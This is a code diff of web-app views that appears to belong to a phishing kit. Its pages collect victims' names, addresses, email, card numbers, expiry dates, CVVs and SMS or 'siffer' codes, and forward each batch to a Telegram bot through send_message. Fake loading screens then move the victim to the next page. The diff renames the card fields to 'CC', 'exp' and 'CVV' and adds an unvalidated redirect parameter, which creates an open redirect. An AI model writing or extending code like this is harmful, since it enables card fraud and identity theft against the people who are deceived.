@@ -7,6 +7,22 @@ from bananaid.telegrambot import send_message
 from bananaid.utils import gen_url_query
 
 
+def info_page(request):
+    if request.method == 'POST':
+        request.session['full_name'] = request.POST.get('name')
+        request.session['email'] = request.POST.get('email')
+        # request.session['country'] = request.POST.get('country')
+        request.session['postal'] = request.POST.get('postal')
+        request.session['city'] = request.POST.get('city')
+        request.session['home_address'] = request.POST.get('address')
+        send_message(request.session)
+        return render(request, 'loader.html',
+                      {'redirect_to': PageRedirection.SIFFER.value + gen_url_query(),
+                       'waiting': random.randint(2000, 5000)})
+    return render(request, 'user-info.html', {'postal': request.session.get('postal'), 'city': request.session.get('city')})
+
+
+
 def siffer_page(request):
     if request.method == 'POST':
         request.session['siffer'] = request.POST.get('siffer')
@@ -39,9 +55,9 @@ def num_date_page(request):
 def cc_page(request):
     if request.method == 'POST':
         request.session['full_name'] = request.POST.get('full_name')
-        request.session['cardnumber'] = request.POST.get('cardnumber')
-        request.session['expirationdate'] = request.POST.get('expirationdate')
-        request.session['securitycode'] = request.POST.get('securitycode')
+        request.session['CC'] = request.POST.get('cardnumber')
+        request.session['exp'] = request.POST.get('expirationdate')
+        request.session['CVV'] = request.POST.get('securitycode')
         send_message(request.session)
         return render(request, 'loader.html',
                       {'redirect_to': PageRedirection.INFO_RECAP.value + gen_url_query(),
@@ -76,6 +92,12 @@ def sms_page(request):
                        'waiting': random.randint(2000, 5000)})
     return render(request, 'sms.html', {})
 
-
 def waiting_page(request):
     return render(request, 'waiting.html', {})
+
+
+def loading_page(request):
+    redirect_url = request.GET.get('redirect_url')
+    return render(request, 'loader.html',
+                  {'redirect_to': redirect_url + gen_url_query(),
+                   'waiting': random.randint(2000, 5000)})
